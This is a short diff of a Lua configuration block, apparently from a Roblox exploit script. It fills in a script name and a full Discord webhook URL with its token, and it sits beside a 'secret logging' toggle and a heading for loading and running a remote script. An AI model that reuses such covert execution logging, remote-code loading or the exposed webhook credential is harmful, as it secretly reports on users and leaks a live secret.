@@ -1,8 +1,8 @@
 he
 
 -- Configuration Variables
-getgenv().whscript = "Your Script Name"  -- Change to the name of your script
-getgenv().webhookexecUrl = "Your Webhook Url"  -- Put your Webhook URL here
+getgenv().whscript = "Remedy"  -- Change to the name of your script
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1285032038851805206/qyoaaeRne2zzt5MgGOLQMOXNJ9R3-NImr7M5pq4BsyDLjlVFC5TqUEU6gC4fkiXKkUKC"  -- Put your Webhook URL here
 getgenv().ExecLogSecret = true  -- Toggle for secret logging
 
 -- Function to load and execute remote script
